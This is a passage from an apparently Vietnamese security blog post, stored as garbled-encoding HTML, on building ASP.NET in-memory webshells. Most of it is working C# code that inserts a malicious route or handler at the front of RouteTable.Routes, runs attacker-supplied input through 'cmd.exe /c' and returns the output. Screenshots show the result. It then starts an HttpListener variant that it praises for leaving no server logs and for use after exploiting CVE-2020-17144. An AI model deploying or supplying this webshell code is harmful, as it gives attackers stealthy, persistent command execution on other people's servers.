&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }}
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;/script&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Káº¿t quáº£ thÃ¬ GetRouteData Ä‘Æ°á»£c gá»i trÆ°á»›c, mÃ¬nh sáº½ dÃ¹ng method nÃ y:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/rkg6PfoBWg.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Khi debug vÃ o chÆ°Æ¡ng trÃ¬nh thÃ¬ vá»›i má»—i request, vá»›i má»—i RouteBase thÃ¬ cÃ¡c method GetRouteData vÃ  GetVirtualPath Ä‘á»u Ä‘Æ°á»£c gá»i láº§n lÆ°á»£t thÃ´ng qua cÃ¢u lá»‡nh foreach:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/S1lyuzsHZg.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
&lt;img src="https://hackmd.io/_uploads/r1VyOGjHZg.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Äá»ƒ route cá»§a báº£n thÃ¢n chÃ¨n vÃ o Ä‘Æ°á»£c cháº¡y Ä‘áº§u tiÃªn trong vÃ²ng for thÃ¬ Ä‘Æ¡n giáº£n mÃ¬nh Insert vÃ o vá»‹ trÃ­ Ä‘áº§u tiÃªn lÃ  Ä‘Æ°á»£c:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;RouteCollection routes = RouteTable.Routes;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;routes.Insert(0, new MyRouteBase());
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;MÃ¬nh sáº½ cÃ³ code deploy route memshell nhÆ° nÃ y:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;span class="lnt"&gt;18
&lt;/span&gt;&lt;span class="lnt"&gt;19
&lt;/span&gt;&lt;span class="lnt"&gt;20
&lt;/span&gt;&lt;span class="lnt"&gt;21
&lt;/span&gt;&lt;span class="lnt"&gt;22
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;public class CustomRouteBase : RouteBase{
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; public override RouteData GetRouteData(HttpContextBase httpContext){
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; String cmd = httpContext.Request.QueryString[&amp;#34;command&amp;#34;];
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; if (cmd != null){
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; HttpResponseBase response = httpContext.Response;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Process p = new Process();
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; p.StartInfo.FileName = &amp;#34;cmd.exe&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; p.StartInfo.Arguments = &amp;#34;/c&amp;#34; + cmd;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; p.Start();
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; byte[] data = Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd());
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; response.Write(System.Text.Encoding.Default.GetString(data));
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; response.End();
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return null;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; public override VirtualPathData GetVirtualPath(RequestContext requestContext, RouteValueDictionary values){
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return null;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;RouteCollection routeCollection = RouteTable.Routes;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;routeCollection.Insert(0, new CustomRouteBase());
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;We got memshell in arbitrary route bois:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/rJRKOfjHWe.png"
loading="lazy"
alt="image"
&gt;&lt;/p&gt;
&lt;h3 id="sá»­-dá»¥ng-systemwebroutingroute"&gt;Sá»­ dá»¥ng System.Web.Routing.Route
&lt;/h3&gt;&lt;p&gt;Náº¿u nhÆ° khÃ´ng muá»‘n tá»± táº¡o class implement RouteBRase thÃ¬ mÃ¬nh cÃ³ thá»ƒ sá»­ dá»¥ng public class System.Web.Routing.Route:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/rJTEcMjSbl.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Má»™t Route há»£p lá»‡ thÃ¬ cáº§n truyá»n vÃ o hai tham sá»‘:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Url dÃ¹ng Ä‘á»ƒ chá»©a giÃ¡ trá»‹ Ä‘Æ°á»ng dáº«n cho route&lt;/li&gt;
&lt;li&gt;RouteHandler Ä‘á»ƒ truyá»n vÃ o handler cho route Ä‘Ã³, vá»›i kiá»ƒu IRouteHandler&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Nháº£y vÃ o IRouteHandler interface, Ä‘á»ƒ implement Ä‘Æ°á»£c interface nÃ y, cáº§n pháº£i override method GetHttpHandler Ä‘á»ƒ xá»­ lÃ½ HTTP Response tráº£ vá» cho ngÆ°á»i dÃ¹ng. Vá»«a hay khi method GetHttpHandler nháº­n Ä‘áº§u vÃ o lÃ  RequestContext â€“ má»™t encapsulation object cá»§a current HTTP request, nÃªn mÃ¬nh cÃ³ thá»ƒ xÃ i nÃ³ Ä‘á»ƒ control request vÃ o vÃ  response ra:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/S1macfjrWx.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Sá»­ dá»¥ng logic bÃªn trÃªn, mÃ¬nh cook thÃ nh Ä‘oáº¡n code nhÆ° nÃ y:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;span class="lnt"&gt;18
&lt;/span&gt;&lt;span class="lnt"&gt;19
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;public class CustomRoute : IRouteHandler {
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; public IHttpHandler GetHttpHandler(RequestContext requestContext){
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; String cmd = requestContext.HttpContext.Request.Form[&amp;#34;command&amp;#34;];
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; if (cmd != null){
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; HttpResponseBase response = requestContext.HttpContext.Response;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Process p = new Process();
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; p.StartInfo.FileName = &amp;#34;cmd.exe&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; p.StartInfo.Arguments = &amp;#34;/c&amp;#34; + cmd;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; p.Start();
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; byte[] data = Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd());
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;response.Write(System.Text.Encoding.Default.GetString(data));
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return null;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;RouteCollection routeCollection = RouteTable.Routes;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Route customRoute = new Route(&amp;#34;RouteMemshell&amp;#34;, new CustomRoute());
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;routeCollection.Insert(0, customRoute);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;NhÆ°ng mÃ  khi gá»i Ä‘áº¿n &lt;code&gt;/RouteMemshell&lt;/code&gt; thÃ¬ mÃ¬nh bá»‹ lá»—i 500, lá»—i nÃ y do CustomRoute táº¡o ra khÃ´ng tráº£ vá» object cÃ³ dáº¡ng IHttpHandler:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/BJHNjfjHZg.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Cáº§n sá»­a láº¡i code xÃ­u Ä‘á»ƒ lÆ°á»£m Ä‘Æ°á»£c output táº¡i response. Cá»¥ thá»ƒ lÃ  method GetHttpHandler cáº§n return object implement interface IHttpHandler thay vÃ¬ chá»‰ exec command.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;span class="lnt"&gt;18
&lt;/span&gt;&lt;span class="lnt"&gt;19
&lt;/span&gt;&lt;span class="lnt"&gt;20
&lt;/span&gt;&lt;span class="lnt"&gt;21
&lt;/span&gt;&lt;span class="lnt"&gt;22
&lt;/span&gt;&lt;span class="lnt"&gt;23
&lt;/span&gt;&lt;span class="lnt"&gt;24
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;public class CustomRoute : IRouteHandler {
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; public IHttpHandler GetHttpHandler(RequestContext requestContext){
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return new CustomHandler(requestContext);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;public class CustomHandler : IHttpHandler{
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; public RequestContext RequestContext { get; private set; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; public CustomHandler(RequestContext context){
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; this.RequestContext = context;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; public void ProcessRequest(HttpContext context){
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; String cmd = context.Request.Form[&amp;#34;command&amp;#34;];
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; if (cmd != null){
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; HttpResponse response = context.Response;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Process p = new Process();
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; p.StartInfo.FileName = &amp;#34;cmd.exe&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; p.StartInfo.Arguments = &amp;#34;/c&amp;#34; + cmd;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; p.Start();
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; byte[] data = Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd());
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; response.Write(System.Text.Encoding.Default.GetString(data));
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; public bool IsReusable { get; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;NhÆ° nÃ y thÃ¬ cÃ³ thá»ƒ láº¥y Ä‘Æ°á»£c response rá»“i:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/ryZToMjBbg.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Máº·c dÃ¹ khÃ´ng thá»ƒ khai bÃ¡o cho cÃ³ thá»ƒ truy cáº­p route memory webshell báº±ng Ä‘Æ°á»ng dáº«n tÃ¹y Ã½ nhÆ°ng cÃ³ thá»ƒ sá»­ dá»¥ng dáº¥u {} Ä‘á»ƒ biá»ƒu diá»…n kÃ½ tá»± ngáº«u nhiÃªn. MÃ¬nh vÃ­ dá»¥ nhÆ° nÃ y:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Route customRoute = new Route(&amp;#34;route{xxx}&amp;#34;, new CustomRoute());
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;ThÃ¬ cÃ³ thá»ƒ sá»­ dá»¥ng route memory webshell vá»›i Ä‘Æ°á»ng dáº«n &amp;ldquo;route&amp;rdquo; káº¿t há»£p vá»›i cÃ¡c kÃ½ tá»± báº¥t ká»³:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/SkYm7YjS-x.png"
loading="lazy"
alt="image"
&gt;&lt;/p&gt;
&lt;h2 id="httplistener-memory-webshell"&gt;HTTPListener Memory Webshell
&lt;/h2&gt;&lt;p&gt;HttpListener lÃ  1 class thuá»™c .NET Base Class Library, cung cáº¥p kháº£ nÄƒng khá»Ÿi táº¡o má»™t HTTP server Ä‘Æ¡n giáº£n vÃ  cÃ³ kháº£ nÄƒng tÃ¹y biáº¿n cao (nghe khÃ¡ giá»‘ng vá»›i &lt;code&gt;python3 -m http.server&lt;/code&gt;) ğŸ‘Œ&lt;br&gt;
KhÃ´ng phá»¥ thuá»™c hay cháº¡y qua IIS cÅ©ng nhÆ° khÃ´ng náº±m trong cÃ¡c thÃ nh pháº§n cá»§a má»™t project ASP.NET, HttpListener chá»‰ cáº§n truyá»n vÃ o Ä‘á»‹a chá»‰ láº¯ng nghe, port vÃ  Ä‘Æ°á»ng dáº«n Ä‘á»ƒ khá»Ÿi táº¡o má»™t web service.
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/H1pTrdsSWg.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Do Ä‘áº·c tÃ­nh hoáº¡t Ä‘á»™ng lÃ  1 service Ä‘á»™c láº­p nÃªn cháº¯c cháº¯n nÃ³ sáº½ khÃ´ng lÆ°u láº¡i log trÃªn server, Ä‘á»“ng thá»i cÃ³ thá»ƒ run cÃ¹ng port, cÃ¹ng host vá»›i service web khiáº¿n nÃ³ khÃ¡ khÃ³ phÃ¡t hiá»‡n náº¿u nhÆ° Ä‘Æ°á»£c deploy.&lt;br&gt;
Tuy nhiÃªn, trong cÃ¡c blog mÃ¬nh tham kháº£o thÃ¬ há» cÃ³ nÃ³i ráº±ng ká»¹ thuáº­t nÃ y chá»‰ cÃ³ thá»ƒ Ä‘Æ°á»£c triá»ƒn khai vá»›i quyá»n System. Äiá»u nÃ y khÃ¡ khÃ³ xáº£y ra do thÃ´ng thÆ°á»ng user deploy webapps sáº½ lÃ  user IIS (default iis apppool\{pool name}). Ngoáº¡i trá»« má»™t sá»‘ trÆ°á»ng há»£p nhÆ° Ä‘á»‘i vá»›i Microsoft Exchange sáº½ máº·c Ä‘á»‹nh cháº¡y quyá»n System nÃªn ká»¹ thuáº­t nÃ y Ä‘Ã£ Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ lÃ m post-exploit memshell sau khi khai thÃ¡c lá»—i deser &lt;a class="link" href="https://www.zcgonvh.com/post/analysis_of_CVE-2020-17144_and_to_weaponizing.html" target="_blank" rel="noopener"
&gt;CVE-2020-17144&lt;/a&gt;&lt;/p&gt;
&lt;h3 id="phÃ¢n-tÃ­ch"&gt;PhÃ¢n tÃ­ch
&lt;/h3&gt;&lt;p&gt;Vá» cÆ¡ báº£n thÃ¬ ká»¹ thuáº­t nÃ y sáº½ khá»Ÿi táº¡o má»™t service web riÃªng biá»‡t nÃªn sáº½ khÃ´ng cháº¡y chÃ¨n vÃ o má»™t class nÃ o cá»§a service web hiá»‡n táº¡i. CÃ´ng viá»‡c cÃ²n láº¡i lÃ  xá»­ lÃ½ HTTP Request Ä‘á»ƒ nháº­n Ä‘Æ°á»£c Ä‘áº§u vÃ o, xá»­ lÃ½ logic vÃ  tráº£ káº¿t quáº£ vá» táº¡i response.&lt;br&gt;
Táº¡i namespace System.Net Ä‘Ã£ tá»“n táº¡i System.Net.HttpListenerContext Ä‘Ã³ng vai trÃ² nháº­n, xá»­ lÃ½ vÃ  tráº£ vá» káº¿t quáº£ cho má»™t HTTP Request nhÆ° lÃ  HttpContext thuá»™c namespace System.Web. NhÆ°ng class HttpListenerRequest khÃ¡ thÃ´ sÆ¡ vÃ  khÃ´ng cÃ³ cÃ¡c phÆ°Æ¡ng thá»©c xá»­ lÃ½ input nhÆ° lÃ  System.Web.Request, nÃªn viá»‡c nháº­n vÃ  xá»­ lÃ½ dá»¯ liá»‡u lÃ  Ä‘iá»u khÃ¡ khÃ³ khÄƒn.&lt;br&gt;
Giáº£i phÃ¡p Ä‘Æ°a ra lÃ  láº¥y háº¿t dá»¯ liá»‡u trong object HttpListenerRequest vÃ  HttpListenerResponse, tá»« Ä‘Ã³ tá»± craft thÃ nh System.Web.HttpRequest Ä‘á»ƒ nháº­n/xá»­ lÃ½ dá»¯ liá»‡u.&lt;br&gt;
Cá»© tÆ°á»Ÿng lÃ  ngon Äƒn, nhÆ°ng quÃ¡ trÃ¬nh parse HTTP Request gáº·p váº¥n Ä‘á» khi HttpRequest khÃ´ng nháº­n Ä‘Æ°á»£c tham sá»‘ táº¡i POST body request, máº·c dÃ¹ váº«n thá»±c hiá»‡n Ä‘Æ°á»£c cÃ¡c hÃ m tÄ©nh. Äá»ƒ lÃ m rÃµ hÆ¡n thÃ¬ mÃ¬nh cÃ³ Ä‘oáº¡n code:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;span class="lnt"&gt;18
&lt;/span&gt;&lt;span class="lnt"&gt;19
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;HttpListenerContext context = listener.GetContext();
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;HttpListenerRequest request = context.Request;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;HttpListenerResponse response = context.Response;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;try {
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; // Láº¥y data tá»« request
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; string data = new StreamReader(request.InputStream, request.ContentEncoding).ReadToEnd();
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; // ÄÆ°a data vá» dáº¡ng byte
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; byte[] rawData = Encoding.Default.GetBytes(data);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; // Khá»Ÿi tao object HttpRequst thuá»™c namespace System.Web Ä‘á»ƒ sá»­ dá»¥ng request linh hoáº¡t hÆ¡n
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; HttpRequest req = new HttpRequest(&amp;#34;&amp;#34;, request.Url.ToString(), request.QueryString.ToString());
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; // Kiá»ƒm tra giÃ¡ trá»‹ cá»§a biáº¿n test
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; String test = req.Form[&amp;#34;test&amp;#34;];
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; if (test != null) { Console.WriteLine(&amp;#34;Parameter test = &amp;#34; + test); }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; else { Console.WriteLine(&amp;#34;Parameter test is null!!!&amp;#34;); }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;catch (Exception e){ return; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;â€¦
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;CustomListener(&amp;#34;http://localhost:8000/test/&amp;#34;);
